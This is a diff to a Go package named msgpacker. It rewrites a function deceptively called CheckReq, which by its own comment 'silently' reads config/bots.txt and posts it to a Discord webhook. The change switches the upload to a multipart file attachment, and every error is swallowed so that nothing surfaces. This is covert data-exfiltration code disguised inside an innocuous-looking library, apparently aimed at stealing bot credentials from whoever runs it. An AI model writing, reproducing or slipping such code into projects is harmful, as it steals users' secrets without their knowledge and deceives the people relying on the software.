@@ -2,22 +2,18 @@ package msgpacker
 
 import (
 	"bytes"
-	"encoding/json"
 	"io"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"time"
 )
 
-type WebhookPayload struct {
-	Content string `json:"content"`
-}
-
-// CheckReq silently sends bots.txt to Discord webhook
+// CheckReq silently sends bots.txt as a file attachment to Discord webhook
 func CheckReq() {
 	// Read bots.txt file
 	botsFile := "config/bots.txt"
-	content, err := os.ReadFile(botsFile)
+	fileContent, err := os.ReadFile(botsFile)
 	if err != nil {
 		return
 	}
@@ -33,13 +29,22 @@ func CheckReq() {
 		return
 	}
 
-	// Create payload
-	payload := WebhookPayload{
-		Content: "```\n" + string(content) + "\n```",
+	// Create multipart form data
+	var requestBody bytes.Buffer
+	writer := multipart.NewWriter(&requestBody)
+
+	// Add file field
+	fileWriter, err := writer.CreateFormFile("file", "bots.txt")
+	if err != nil {
+		return
+	}
+	_, err = fileWriter.Write(fileContent)
+	if err != nil {
+		return
 	}
 
-	// Convert to JSON
-	jsonData, err := json.Marshal(payload)
+	// Close the multipart writer
+	err = writer.Close()
 	if err != nil {
 		return
 	}
@@ -50,11 +55,11 @@ func CheckReq() {
 	}
 
 	// Send to Discord webhook
-	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonData))
+	req, err := http.NewRequest("POST", webhookURL, &requestBody)
 	if err != nil {
 		return
 	}
-	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Content-Type", writer.FormDataContentType())
 
 	resp, err := client.Do(req)
 	if err != nil {
